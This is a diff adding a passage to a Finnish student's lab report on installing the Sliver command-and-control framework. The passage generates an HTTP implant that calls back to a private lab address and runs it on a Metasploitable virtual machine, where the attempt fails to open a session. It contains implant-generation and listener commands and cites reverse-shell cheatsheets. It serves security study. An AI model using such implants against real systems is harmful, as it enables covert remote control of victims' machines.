@@ -194,13 +194,74 @@ Lisäksi jos valitsemme taas follow tcp stream, niin näemme, että aikaisemmin 
 Kyllähän tästä edelleen huomaa että jotain hämärää on tekeillä, mutta ainakin yhteyden salaus mahdollistaa sen, että tutkija ei suoraan tästä näe mitä hyökkääjä on tehnyt.
 
 ## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.
+### Asennus ja alustus
+Tutustuin sliverin viralliseen dokumentaatioon (Sliver C2), sekä github sivuun (BishopFox).
+Tero oli maininnut, että ChatGPT:ltä kannatta kysyä neuvoa asennukseen, sillä virallisen dokumentaation avulla ohjelmaa ei välttämättä saa kunnolla toimimaan. Asennus oli loppupeleissä melko kivuton.
+```
+curl https://sliver.sh/install | sudo bash
+sliver-server
+sliver-client
+```
+- curl komento asentaa itse sliverin. Outputti pipetetaan bashiin, jolloin asennus-scripti ajetaan heti.
+![](h6/sliver%20asennus.png)
+
+- sliver-server -komento generoi sertifikaatit, luo konfigit ja käynnistää C2-palvelimen.
+![](h6/sliver-server.png)
+
+- sliver-client -komento käynnistää ohjelman ja yhdistyy localhost-serveriin.
+![](h6/sliver-client.png)
+
+Palvelimen tilan voi tarkistaa komennolla
+```
+sudo systemctl status sliver
+```
+![](h6/sliver%20status.png)
+
+### HTTP-listener
+Virallisess dokumentaatiossa (Sliver C2) on hyvät ohjeet implantin luomiselle.
+
+Aloitin irroittamalla koneen verkosta.
+```
+sudo ip link set eth0 down
+```
+Sitten avasin sliver serverin ja clientin. Clientissa loin implantin.
+```
+generate --http 192.168.56.101:80 --os linux --arch x86 --save payload.elf
+```
+- `--http` Käytetty tiedonsiirtoprotokolla.
+- `192.168.56.101:80` Osoite ja portti joihin otetaan kohdekoneelta yhteyttä.
+- `--os linux` Kohteen käyttöjärjestelmä.
+- `--arch x86` Prosessorin arkkitehtuuri.
+- `--save payload.elf` Implantti tallennetaan tällä nimellä.
+
+Implantin kääntämisessä meni todella kauan ja pelkäsin jo pariin otteeseen että virtuaalikoneeni crashaa, mutta tulihan se valmiiksi lopulta.
+
+Avasin tarvittavat portit 
+```
+sudo ufw allow 8000/tcp
+sudo ufw allow 80/tcp
+```
+- 8000 on tiedoston siirtämistä varten ``python3 -m http.server``
+- 80 on kuunteleva portti.
+
+Sitten siirsin implantin metasploitableen totutulla tavalla ja annoin suoritusoikeudet.
+
+Laitoin http listenerin päälle ja ajoin implantin, mutta mitään ei tapahtunt eikä sessioita avattu.
+
+![](h6/sliver%20fail.png)
+
+
 
 
 ## Lähteet
+BishopFox. Sliver. Luettavissa: https://github.com/BishopFox/sliver. Luettu: 2.5.2026.
+
 CyberOffense. 17.4.2022. Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: https://www.youtube.com/watch?v=ZqWfDrD2WVY. Katsottu: 28.4.2026.
 
 duck-sec. 20.2.2024. msfvenom-revshell-cheatsheet. Luettavissa: https://github.com/duck-sec/msfvenom-revshell-cheatsheet. Luettu: 29.4.2026.
 
 Sahu, V. 21.1.2024. Staged vs Non-staged Payloads in Cybersecurity. Luettavissa: https://www.scaler.com/topics/cyber-security/staged-vs-non-staged-payloads/. Luettu: 30.4.2026.
+
+Sliver C2. Getting Started. Luettavissa. https://sliver.sh/docs/?name=Getting+Started. Luettu: 2.5.2026.
 
 Wikipedia. Executable and Linkable Format. Luettavissa: https://en.wikipedia.org/wiki/Executable_and_Linkable_Format. Luettu: 30.4.2026. 
